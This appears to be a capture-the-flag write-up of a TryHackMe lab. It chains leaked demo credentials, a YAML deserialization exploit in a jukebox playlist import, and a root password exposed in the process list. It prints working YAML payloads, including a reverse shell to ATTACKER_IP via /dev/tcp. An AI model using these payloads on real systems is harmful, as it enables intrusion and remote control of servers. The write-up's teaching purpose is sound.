# Beach Bar — TryHackMe
**Category:** Boot2Root / Web
**Platform:** TryHackMe — Hacker Holidays 2026

## Challenge Summary
The Byte Lotus beach bar has a "DJ sign-in" jukebox web app that lets guests manage
tonight's playlist. The night-shift developer wired the jukebox straight into the
floor system with more functionality attached than intended. Goal was to get a
shell, find the user flag, then escalate to root.

## Steps Taken
1. Connected to the lab machine over OpenVPN and opened the target site — a "DJ
   Boot" login page for managing the jukebox playlist.
2. **What didn't work:** Tried basic SQL injection payloads in the username and
   password fields. Got "invalid credentials" back — not the right path.
3. **Recon:** Viewed the page source and found an HTML comment left in by the
   developer — a staff note saying the demo DJ login was still enabled for the
   soft opening, with credentials `dj` / `dj` still active.
4. Logged in with `dj:dj` and landed on the jukebox floor page, with **Import** and
   **Export** playlist options.
5. Clicked **Export** and got a `.yml` playlist file back:
```yaml
   # Beach Bar jukebox playlist export
   playlist:
     name: Sunset Session
     vibe: golden hour
     tracks:
       - artist: Khruangbin
         title: Maria Tambien
       - artist: Men I Trust
         title: Show Me How
       - artist: Crumb
         title: Locket
```
   The **Import** feature accepted pasted or uploaded YAML — an obvious spot to
   test for **YAML deserialization**.
6. Searched for basic YAML exploit payloads and tested with a harmless one first,
   to confirm code execution before going further:
```yaml
   vibe: !!python/object/apply:time.sleep [2]
```
   Timed the response and confirmed the import was actually pausing for the given
   number of seconds — confirming arbitrary Python object instantiation via
   `!!python/object/apply` / `!!python/object/new` was executing server-side.
7. **What worked:** Searched for a YAML reverse shell payload and adapted it:
```yaml
   vibe: !!python/object/new:os.system ["bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1\""]
```
   Got my tun0 IP via `ifconfig`, swapped it into the payload, started a `nc -lvnp 1234`
   listener locally, then clicked **Import → Load playlist**.
8. Got a reverse shell as soon as the playlist loaded. Navigated to the home
   directory, found a user `bartender`, moved into their directory, and `cat`'d a
   text file containing the **user flag**.
## Privilege Escalation
1. Poked around the app's working directory (`/opt/beach-bar` or similar) and found
   an `app.py` plus other suspicious files/folders, including something referencing
   a "jukebox" component.
2. Found a `jukebox.py` (or similar) script and read through it — it referenced
   streaming a **backend password**, tying back to the room's hint about the
   jukebox "taking requests" and a service "quietly announcing something."
3. Ran `ps aux | grep jukebox` to check running processes tied to that component,
   and the process list revealed the **root password in plaintext**, being passed
   as part of the running command/stream.
4. Used `su root` (or `su -`) with the recovered password, confirmed root access
   with `whoami`, moved to `/root`, and retrieved the **root flag**.

## Root Cause
Two separate vulnerabilities chained together:
1. **Leftover demo credentials + exposed dev comment.** A hardcoded demo login
   (`dj:dj`) was left enabled in production and disclosed via an HTML comment
   meant for internal staff — classic information disclosure through unreviewed
   front-end code.
2. **Insecure YAML deserialization (`yaml.load` without `SafeLoader`).** The
   playlist import feature parsed user-supplied YAML using a loader that allows
   arbitrary Python object construction (`!!python/object/new`), turning a "song
   playlist upload" feature into full remote code execution.
3. **Privilege escalation via process list exposure.** The backend password for
   root was passed as a command-line argument/environment to a running process,
   making it visible to any user who could run `ps aux` — a very common but
   serious privesc vector, since process arguments are visible to all local users
   by default on Linux.

## Category Note
This is a **Web + Boot2Root chain**: initial foothold through insecure
deserialization (a variant of unsafe `yaml.load()` usage, related to CWE-502), and
privilege escalation through poor secrets handling (plaintext credentials visible
via process enumeration). A good reminder that user privesc often comes down to
basic enumeration (`ps aux`, config files, cron jobs) rather than exotic exploits.
